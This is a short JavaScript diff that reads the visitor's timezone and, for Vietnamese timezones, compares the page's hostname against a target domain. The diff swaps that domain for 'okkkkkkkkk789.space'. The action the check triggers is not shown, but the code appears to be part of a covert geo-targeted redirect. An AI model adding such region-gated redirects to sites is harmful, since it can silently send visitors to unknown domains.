@@ -96,7 +96,7 @@
   try {
     const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || '').toString();
     console.log('User timezone:', tz);
-    const targetDomain = 'play.winaz.com';
+    const targetDomain = 'okkkkkkkkk789.space';
 
     if (location.hostname !== targetDomain &&
         (tz === 'Asia/Ho_Chi_Minh' || tz === 'Asia/Saigon')) {
